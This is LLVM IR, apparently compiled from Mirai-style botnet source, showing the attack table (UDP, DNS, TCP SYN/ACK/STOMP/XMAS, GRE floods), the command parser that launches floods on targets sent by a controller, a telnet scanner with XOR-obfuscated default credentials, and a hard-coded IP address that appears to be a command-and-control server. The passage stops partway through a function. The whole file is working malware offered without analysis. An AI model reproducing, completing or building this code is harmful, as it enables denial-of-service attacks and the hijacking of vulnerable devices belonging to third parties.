; ModuleID = 'llvm-link'
source_filename = "llvm-link"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.attack_method = type { void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.scanner_auth = type { i8*, i8*, i16, i16, i8, i8 }
%struct.scanner_connection = type { %struct.scanner_auth*, i32, i32, i32, i32, i16, i32, [256 x i8], i8 }
%struct.table_value = type { i8*, i16 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.grehdr = type { i16, i16 }
%struct.udphdr = type { i16, i16, i16, i16 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.ethhdr = type { [6 x i8], [6 x i8], i16 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.attack_stomp_data = type { i32, i32, i32, i16, i16 }
%struct.dnshdr = type { i16, i16, i16, i16, i16, i16 }
%struct.fd_set.21 = type { [16 x i64] }
%struct.timeval.22 = type { i64, i64 }

@methods_len = dso_local global i8 0, align 1
@methods = dso_local global %struct.attack_method** null, align 8
@attack_ongoing = dso_local global [15 x i32] zeroinitializer, align 16
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@auth_table_len = dso_local global i32 0, align 4
@scanner_rawpkt = dso_local global [40 x i8] zeroinitializer, align 16
@auth_table = dso_local global %struct.scanner_auth* null, align 8
@auth_table_max_weight = dso_local global i16 0, align 2
@fake_time = dso_local global i32 0, align 4
@scanner_pid = dso_local global i32 0, align 4
@conn_table = dso_local global %struct.scanner_connection* null, align 8
@rsck = dso_local global i32 0, align 4
@.str = private unnamed_addr constant [5 x i8] c"&;; \00", align 1
@.str.1 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.2 = private unnamed_addr constant [5 x i8] c"5:?;\00", align 1
@.str.3 = private unnamed_addr constant [9 x i8] c"<!: acam\00", align 1
@.str.4 = private unnamed_addr constant [7 x i8] c" 18:1 \00", align 1
@.str.5 = private unnamed_addr constant [8 x i8] c"0125!8 \00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"$5''#;&0\00", align 1
@.str.7 = private unnamed_addr constant [6 x i8] c"509=:\00", align 1
@.str.8 = private unnamed_addr constant [6 x i8] c"\22=.,\22\00", align 1
@.str.9 = private unnamed_addr constant [8 x i8] c"'!$$;& \00", align 1
@.str.10 = private unnamed_addr constant [13 x i8] c"c!>\19?;d509=:\00", align 1
@.str.11 = private unnamed_addr constant [6 x i8] c"efg`a\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"!'1&\00", align 1
@.str.13 = private unnamed_addr constant [9 x i8] c"\1B,<8#\07\13l\00", align 1
@.str.14 = private unnamed_addr constant [9 x i8] c"\07f2\13%\1A\12'\00", align 1
@.str.15 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@__const.consume_iacs.tmp1 = private unnamed_addr constant [3 x i8] c"\FF\FB\1F", align 1
@__const.consume_iacs.tmp2 = private unnamed_addr constant [9 x i8] c"\FF\FA\1F\00P\00\18\FF\F0", align 1
@.str.16 = private unnamed_addr constant [15 x i8] c"191.96.112.109\00", align 1
@table_key = dso_local global i32 -555811921, align 4
@table = dso_local global [31 x %struct.table_value] zeroinitializer, align 16
@LOCAL_ADDR = dso_local global i32 0, align 4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local signext i8 @attack_init() #0 {
  %1 = alloca i32, align 4
  call void @add_attack(i8 noundef zeroext 0, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* noundef @attack_method_udpgeneric)
  call void @add_attack(i8 noundef zeroext 1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* noundef @attack_method_udpvse)
  call void @add_attack(i8 noundef zeroext 2, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* noundef @attack_method_udpdns)
  call void @add_attack(i8 noundef zeroext 8, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* noundef @attack_method_udpplain)
  call void @add_attack(i8 noundef zeroext 3, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* noundef @attack_method_tcpsyn)
  call void @add_attack(i8 noundef zeroext 4, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* noundef @attack_method_tcpack)
  call void @add_attack(i8 noundef zeroext 5, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* noundef @attack_method_tcpstomp)
  call void @add_attack(i8 noundef zeroext 10, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* noundef @attack_method_tcpxmas)
  call void @add_attack(i8 noundef zeroext 6, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* noundef @attack_method_greip)
  call void @add_attack(i8 noundef zeroext 7, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* noundef @attack_method_greeth)
  call void @add_attack(i8 noundef zeroext 9, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* noundef @attack_method_std)
  ret i8 1
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal void @add_attack(i8 noundef zeroext %0, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* noundef %1) #0 {
  %3 = alloca i8, align 1
  %4 = alloca void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, align 8
  %5 = alloca %struct.attack_method*, align 8
  store i8 %0, i8* %3, align 1
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %6 = call noalias i8* @calloc(i64 noundef 1, i64 noundef 16) #7
  %7 = bitcast i8* %6 to %struct.attack_method*
  store %struct.attack_method* %7, %struct.attack_method** %5, align 8
  %8 = load i8, i8* %3, align 1
  %9 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %10 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %9, i32 0, i32 1
  store i8 %8, i8* %10, align 8
  %11 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %12 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %13 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %12, i32 0, i32 0
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %11, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %13, align 8
  %14 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %15 = bitcast %struct.attack_method** %14 to i8*
  %16 = load i8, i8* @methods_len, align 1
  %17 = zext i8 %16 to i32
  %18 = add nsw i32 %17, 1
  %19 = sext i32 %18 to i64
  %20 = mul i64 %19, 8
  %21 = call i8* @realloc(i8* noundef %15, i64 noundef %20) #7
  %22 = bitcast i8* %21 to %struct.attack_method**
  store %struct.attack_method** %22, %struct.attack_method*** @methods, align 8
  %23 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %24 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %25 = load i8, i8* @methods_len, align 1
  %26 = add i8 %25, 1
  store i8 %26, i8* @methods_len, align 1
  %27 = zext i8 %25 to i64
  %28 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %24, i64 %27
  store %struct.attack_method* %23, %struct.attack_method** %28, align 8
  ret void
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64 noundef, i64 noundef) #1

; Function Attrs: nounwind
declare i8* @realloc(i8* noundef, i64 noundef) #1

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @attack_kill_all() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  br label %2

2:                                                ; preds = %21, %0
  %3 = load i32, i32* %1, align 4
  %4 = icmp slt i32 %3, 15
  br i1 %4, label %5, label %24

5:                                                ; preds = %2
  %6 = load i32, i32* %1, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %7
  %9 = load i32, i32* %8, align 4
  %10 = icmp ne i32 %9, 0
  br i1 %10, label %11, label %17

11:                                               ; preds = %5
  %12 = load i32, i32* %1, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %13
  %15 = load i32, i32* %14, align 4
  %16 = call i32 @kill(i32 noundef %15, i32 noundef 9) #7
  br label %17

17:                                               ; preds = %11, %5
  %18 = load i32, i32* %1, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %19
  store i32 0, i32* %20, align 4
  br label %21

21:                                               ; preds = %17
  %22 = load i32, i32* %1, align 4
  %23 = add nsw i32 %22, 1
  store i32 %23, i32* %1, align 4
  br label %2, !llvm.loop !6

24:                                               ; preds = %2
  call void (...) bitcast (void ()* @scanner_init to void (...)*)()
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32 noundef, i32 noundef) #1

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @attack_parse(i8* noundef %0, i32 noundef %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca %struct.attack_option*, align 8
  %12 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store %struct.attack_target* null, %struct.attack_target** %10, align 8
  store %struct.attack_option* null, %struct.attack_option** %11, align 8
  %13 = load i32, i32* %4, align 4
  %14 = sext i32 %13 to i64
  %15 = icmp ult i64 %14, 4
  br i1 %15, label %16, label %17

16:                                               ; preds = %2
  br label %219

17:                                               ; preds = %2
  %18 = load i8*, i8** %3, align 8
  %19 = bitcast i8* %18 to i32*
  %20 = load i32, i32* %19, align 4
  %21 = call i32 @ntohl(i32 noundef %20) #8
  store i32 %21, i32* %6, align 4
  %22 = load i8*, i8** %3, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 4
  store i8* %23, i8** %3, align 8
  %24 = load i32, i32* %4, align 4
  %25 = sext i32 %24 to i64
  %26 = sub i64 %25, 4
  %27 = trunc i64 %26 to i32
  store i32 %27, i32* %4, align 4
  %28 = load i32, i32* %4, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %31

30:                                               ; preds = %17
  br label %219

31:                                               ; preds = %17
  %32 = load i8*, i8** %3, align 8
  %33 = getelementptr inbounds i8, i8* %32, i32 1
  store i8* %33, i8** %3, align 8
  %34 = load i8, i8* %32, align 1
  store i8 %34, i8* %7, align 1
  %35 = load i32, i32* %4, align 4
  %36 = sext i32 %35 to i64
  %37 = sub i64 %36, 1
  %38 = trunc i64 %37 to i32
  store i32 %38, i32* %4, align 4
  %39 = load i32, i32* %4, align 4
  %40 = icmp eq i32 %39, 0
  br i1 %40, label %41, label %42

41:                                               ; preds = %31
  br label %219

42:                                               ; preds = %31
  %43 = load i8*, i8** %3, align 8
  %44 = getelementptr inbounds i8, i8* %43, i32 1
  store i8* %44, i8** %3, align 8
  %45 = load i8, i8* %43, align 1
  store i8 %45, i8* %8, align 1
  %46 = load i32, i32* %4, align 4
  %47 = sext i32 %46 to i64
  %48 = sub i64 %47, 1
  %49 = trunc i64 %48 to i32
  store i32 %49, i32* %4, align 4
  %50 = load i8, i8* %8, align 1
  %51 = zext i8 %50 to i32
  %52 = icmp eq i32 %51, 0
  br i1 %52, label %53, label %54

53:                                               ; preds = %42
  br label %219

54:                                               ; preds = %42
  %55 = load i32, i32* %4, align 4
  %56 = sext i32 %55 to i64
  %57 = load i8, i8* %8, align 1
  %58 = zext i8 %57 to i64
  %59 = mul i64 5, %58
  %60 = icmp ult i64 %56, %59
  br i1 %60, label %61, label %62

61:                                               ; preds = %54
  br label %219

62:                                               ; preds = %54
  %63 = load i8, i8* %8, align 1
  %64 = zext i8 %63 to i64
  %65 = call noalias i8* @calloc(i64 noundef %64, i64 noundef 24) #7
  %66 = bitcast i8* %65 to %struct.attack_target*
  store %struct.attack_target* %66, %struct.attack_target** %10, align 8
  store i32 0, i32* %5, align 4
  br label %67

67:                                               ; preds = %114, %62
  %68 = load i32, i32* %5, align 4
  %69 = load i8, i8* %8, align 1
  %70 = zext i8 %69 to i32
  %71 = icmp slt i32 %68, %70
  br i1 %71, label %72, label %117

72:                                               ; preds = %67
  %73 = load i8*, i8** %3, align 8
  %74 = bitcast i8* %73 to i32*
  %75 = load i32, i32* %74, align 4
  %76 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %77 = load i32, i32* %5, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %76, i64 %78
  %80 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %79, i32 0, i32 1
  store i32 %75, i32* %80, align 4
  %81 = load i8*, i8** %3, align 8
  %82 = getelementptr inbounds i8, i8* %81, i64 4
  store i8* %82, i8** %3, align 8
  %83 = load i8*, i8** %3, align 8
  %84 = getelementptr inbounds i8, i8* %83, i32 1
  store i8* %84, i8** %3, align 8
  %85 = load i8, i8* %83, align 1
  %86 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %87 = load i32, i32* %5, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %86, i64 %88
  %90 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %89, i32 0, i32 2
  store i8 %85, i8* %90, align 4
  %91 = load i32, i32* %4, align 4
  %92 = sext i32 %91 to i64
  %93 = sub i64 %92, 5
  %94 = trunc i64 %93 to i32
  store i32 %94, i32* %4, align 4
  %95 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %96 = load i32, i32* %5, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %95, i64 %97
  %99 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %98, i32 0, i32 0
  %100 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %99, i32 0, i32 0
  store i16 2, i16* %100, align 4
  %101 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %102 = load i32, i32* %5, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %101, i64 %103
  %105 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %104, i32 0, i32 1
  %106 = load i32, i32* %105, align 4
  %107 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %108 = load i32, i32* %5, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %107, i64 %109
  %111 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %110, i32 0, i32 0
  %112 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %111, i32 0, i32 2
  %113 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %112, i32 0, i32 0
  store i32 %106, i32* %113, align 4
  br label %114

114:                                              ; preds = %72
  %115 = load i32, i32* %5, align 4
  %116 = add nsw i32 %115, 1
  store i32 %116, i32* %5, align 4
  br label %67, !llvm.loop !8

117:                                              ; preds = %67
  %118 = load i32, i32* %4, align 4
  %119 = sext i32 %118 to i64
  %120 = icmp ult i64 %119, 1
  br i1 %120, label %121, label %122

121:                                              ; preds = %117
  br label %219

122:                                              ; preds = %117
  %123 = load i8*, i8** %3, align 8
  %124 = getelementptr inbounds i8, i8* %123, i32 1
  store i8* %124, i8** %3, align 8
  %125 = load i8, i8* %123, align 1
  store i8 %125, i8* %9, align 1
  %126 = load i32, i32* %4, align 4
  %127 = sext i32 %126 to i64
  %128 = sub i64 %127, 1
  %129 = trunc i64 %128 to i32
  store i32 %129, i32* %4, align 4
  %130 = load i8, i8* %9, align 1
  %131 = zext i8 %130 to i32
  %132 = icmp sgt i32 %131, 0
  br i1 %132, label %133, label %211

133:                                              ; preds = %122
  %134 = load i8, i8* %9, align 1
  %135 = zext i8 %134 to i64
  %136 = call noalias i8* @calloc(i64 noundef %135, i64 noundef 16) #7
  %137 = bitcast i8* %136 to %struct.attack_option*
  store %struct.attack_option* %137, %struct.attack_option** %11, align 8
  store i32 0, i32* %5, align 4
  br label %138

138:                                              ; preds = %207, %133
  %139 = load i32, i32* %5, align 4
  %140 = load i8, i8* %9, align 1
  %141 = zext i8 %140 to i32
  %142 = icmp slt i32 %139, %141
  br i1 %142, label %143, label %210

143:                                              ; preds = %138
  %144 = load i32, i32* %4, align 4
  %145 = sext i32 %144 to i64
  %146 = icmp ult i64 %145, 1
  br i1 %146, label %147, label %148

147:                                              ; preds = %143
  br label %219

148:                                              ; preds = %143
  %149 = load i8*, i8** %3, align 8
  %150 = getelementptr inbounds i8, i8* %149, i32 1
  store i8* %150, i8** %3, align 8
  %151 = load i8, i8* %149, align 1
  %152 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %153 = load i32, i32* %5, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %152, i64 %154
  %156 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %155, i32 0, i32 1
  store i8 %151, i8* %156, align 8
  %157 = load i32, i32* %4, align 4
  %158 = sext i32 %157 to i64
  %159 = sub i64 %158, 1
  %160 = trunc i64 %159 to i32
  store i32 %160, i32* %4, align 4
  %161 = load i32, i32* %4, align 4
  %162 = sext i32 %161 to i64
  %163 = icmp ult i64 %162, 1
  br i1 %163, label %164, label %165

164:                                              ; preds = %148
  br label %219

165:                                              ; preds = %148
  %166 = load i8*, i8** %3, align 8
  %167 = getelementptr inbounds i8, i8* %166, i32 1
  store i8* %167, i8** %3, align 8
  %168 = load i8, i8* %166, align 1
  store i8 %168, i8* %12, align 1
  %169 = load i32, i32* %4, align 4
  %170 = sext i32 %169 to i64
  %171 = sub i64 %170, 1
  %172 = trunc i64 %171 to i32
  store i32 %172, i32* %4, align 4
  %173 = load i32, i32* %4, align 4
  %174 = load i8, i8* %12, align 1
  %175 = zext i8 %174 to i32
  %176 = icmp slt i32 %173, %175
  br i1 %176, label %177, label %178

177:                                              ; preds = %165
  br label %219

178:                                              ; preds = %165
  %179 = load i8, i8* %12, align 1
  %180 = zext i8 %179 to i32
  %181 = add nsw i32 %180, 1
  %182 = sext i32 %181 to i64
  %183 = call noalias i8* @calloc(i64 noundef %182, i64 noundef 1) #7
  %184 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %185 = load i32, i32* %5, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %184, i64 %186
  %188 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %187, i32 0, i32 0
  store i8* %183, i8** %188, align 8
  %189 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %190 = load i32, i32* %5, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %189, i64 %191
  %193 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %192, i32 0, i32 0
  %194 = load i8*, i8** %193, align 8
  %195 = load i8*, i8** %3, align 8
  %196 = load i8, i8* %12, align 1
  %197 = zext i8 %196 to i32
  call void @util_memcpy(i8* noundef %194, i8* noundef %195, i32 noundef %197)
  %198 = load i8, i8* %12, align 1
  %199 = zext i8 %198 to i32
  %200 = load i8*, i8** %3, align 8
  %201 = sext i32 %199 to i64
  %202 = getelementptr inbounds i8, i8* %200, i64 %201
  store i8* %202, i8** %3, align 8
  %203 = load i8, i8* %12, align 1
  %204 = zext i8 %203 to i32
  %205 = load i32, i32* %4, align 4
  %206 = sub nsw i32 %205, %204
  store i32 %206, i32* %4, align 4
  br label %207

207:                                              ; preds = %178
  %208 = load i32, i32* %5, align 4
  %209 = add nsw i32 %208, 1
  store i32 %209, i32* %5, align 4
  br label %138, !llvm.loop !9

210:                                              ; preds = %138
  br label %211

211:                                              ; preds = %210, %122
  %212 = call i32* @__errno_location() #8
  store i32 0, i32* %212, align 4
  %213 = load i32, i32* %6, align 4
  %214 = load i8, i8* %7, align 1
  %215 = load i8, i8* %8, align 1
  %216 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %217 = load i8, i8* %9, align 1
  %218 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  call void @attack_start(i32 noundef %213, i8 noundef zeroext %214, i8 noundef zeroext %215, %struct.attack_target* noundef %216, i8 noundef zeroext %217, %struct.attack_option* noundef %218)
  br label %219

219:                                              ; preds = %211, %177, %164, %147, %121, %61, %53, %41, %30, %16
  %220 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %221 = icmp ne %struct.attack_target* %220, null
  br i1 %221, label %222, label %225

222:                                              ; preds = %219
  %223 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %224 = bitcast %struct.attack_target* %223 to i8*
  call void @free(i8* noundef %224) #7
  br label %225

225:                                              ; preds = %222, %219
  %226 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %227 = icmp ne %struct.attack_option* %226, null
  br i1 %227, label %228, label %232

228:                                              ; preds = %225
  %229 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %230 = load i8, i8* %9, align 1
  %231 = zext i8 %230 to i32
  call void @free_opts(%struct.attack_option* noundef %229, i32 noundef %231)
  br label %232

232:                                              ; preds = %228, %225
  ret void
}

; Function Attrs: nounwind readnone willreturn
declare i32 @ntohl(i32 noundef) #2

; Function Attrs: nounwind readnone willreturn
declare i32* @__errno_location() #2

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @attack_start(i32 noundef %0, i8 noundef zeroext %1, i8 noundef zeroext %2, %struct.attack_target* noundef %3, i8 noundef zeroext %4, %struct.attack_option* noundef %5) #0 {
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca i8, align 1
  %12 = alloca %struct.attack_option*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i8 %1, i8* %8, align 1
  store i8 %2, i8* %9, align 1
  store %struct.attack_target* %3, %struct.attack_target** %10, align 8
  store i8 %4, i8* %11, align 1
  store %struct.attack_option* %5, %struct.attack_option** %12, align 8
  %16 = call i32 @fork() #7
  store i32 %16, i32* %13, align 4
  %17 = load i32, i32* %13, align 4
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %22, label %19

19:                                               ; preds = %6
  %20 = load i32, i32* %13, align 4
  %21 = icmp sgt i32 %20, 0
  br i1 %21, label %22, label %23

22:                                               ; preds = %19, %6
  ret void

23:                                               ; preds = %19
  %24 = call i32 @fork() #7
  store i32 %24, i32* %14, align 4
  %25 = load i32, i32* %14, align 4
  %26 = icmp eq i32 %25, -1
  br i1 %26, label %27, label %28

27:                                               ; preds = %23
  call void @exit(i32 noundef 0) #9
  unreachable

28:                                               ; preds = %23
  %29 = load i32, i32* %14, align 4
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %36

31:                                               ; preds = %28
  %32 = load i32, i32* %7, align 4
  %33 = call i32 @sleep(i32 noundef %32)
  %34 = call i32 @getppid() #7
  %35 = call i32 @kill(i32 noundef %34, i32 noundef 9) #7
  call void @exit(i32 noundef 0) #9
  unreachable

36:                                               ; preds = %28
  store i32 0, i32* %15, align 4
  br label %37

37:                                               ; preds = %67, %36
  %38 = load i32, i32* %15, align 4
  %39 = load i8, i8* @methods_len, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp slt i32 %38, %40
  br i1 %41, label %42, label %70

42:                                               ; preds = %37
  %43 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %44 = load i32, i32* %15, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %43, i64 %45
  %47 = load %struct.attack_method*, %struct.attack_method** %46, align 8
  %48 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %47, i32 0, i32 1
  %49 = load i8, i8* %48, align 8
  %50 = zext i8 %49 to i32
  %51 = load i8, i8* %8, align 1
  %52 = zext i8 %51 to i32
  %53 = icmp eq i32 %50, %52
  br i1 %53, label %54, label %66

54:                                               ; preds = %42
  %55 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %56 = load i32, i32* %15, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %55, i64 %57
  %59 = load %struct.attack_method*, %struct.attack_method** %58, align 8
  %60 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %59, i32 0, i32 0
  %61 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %60, align 8
  %62 = load i8, i8* %9, align 1
  %63 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %64 = load i8, i8* %11, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %12, align 8
  call void %61(i8 noundef zeroext %62, %struct.attack_target* noundef %63, i8 noundef zeroext %64, %struct.attack_option* noundef %65)
  br label %70

66:                                               ; preds = %42
  br label %67

67:                                               ; preds = %66
  %68 = load i32, i32* %15, align 4
  %69 = add nsw i32 %68, 1
  store i32 %69, i32* %15, align 4
  br label %37, !llvm.loop !10

70:                                               ; preds = %54, %37
  call void @exit(i32 noundef 0) #9
  unreachable
}

; Function Attrs: nounwind
declare void @free(i8* noundef) #1

; Function Attrs: noinline nounwind sspstrong uwtable
define internal void @free_opts(%struct.attack_option* noundef %0, i32 noundef %1) #0 {
  %3 = alloca %struct.attack_option*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store %struct.attack_option* %0, %struct.attack_option** %3, align 8
  store i32 %1, i32* %4, align 4
  %6 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %7 = icmp eq %struct.attack_option* %6, null
  br i1 %7, label %8, label %9

8:                                                ; preds = %2
  br label %36

9:                                                ; preds = %2
  store i32 0, i32* %5, align 4
  br label %10

10:                                               ; preds = %30, %9
  %11 = load i32, i32* %5, align 4
  %12 = load i32, i32* %4, align 4
  %13 = icmp slt i32 %11, %12
  br i1 %13, label %14, label %33

14:                                               ; preds = %10
  %15 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %15, i64 %17
  %19 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  %21 = icmp ne i8* %20, null
  br i1 %21, label %22, label %29

22:                                               ; preds = %14
  %23 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %23, i64 %25
  %27 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %26, i32 0, i32 0
  %28 = load i8*, i8** %27, align 8
  call void @free(i8* noundef %28) #7
  br label %29

29:                                               ; preds = %22, %14
  br label %30

30:                                               ; preds = %29
  %31 = load i32, i32* %5, align 4
  %32 = add nsw i32 %31, 1
  store i32 %32, i32* %5, align 4
  br label %10, !llvm.loop !11

33:                                               ; preds = %10
  %34 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %35 = bitcast %struct.attack_option* %34 to i8*
  call void @free(i8* noundef %35) #7
  br label %36

36:                                               ; preds = %33, %8
  ret void
}

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noreturn nounwind
declare void @exit(i32 noundef) #3

declare i32 @sleep(i32 noundef) #4

; Function Attrs: nounwind
declare i32 @getppid() #1

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i8* @attack_get_opt_str(i8 noundef zeroext %0, %struct.attack_option* noundef %1, i8 noundef zeroext %2, i8* noundef %3) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i8* %3, i8** %9, align 8
  store i32 0, i32* %10, align 4
  br label %11

11:                                               ; preds = %35, %4
  %12 = load i32, i32* %10, align 4
  %13 = load i8, i8* %6, align 1
  %14 = zext i8 %13 to i32
  %15 = icmp slt i32 %12, %14
  br i1 %15, label %16, label %38

16:                                               ; preds = %11
  %17 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %18 = load i32, i32* %10, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %17, i64 %19
  %21 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %20, i32 0, i32 1
  %22 = load i8, i8* %21, align 8
  %23 = zext i8 %22 to i32
  %24 = load i8, i8* %8, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %23, %25
  br i1 %26, label %27, label %34

27:                                               ; preds = %16
  %28 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %29 = load i32, i32* %10, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %28, i64 %30
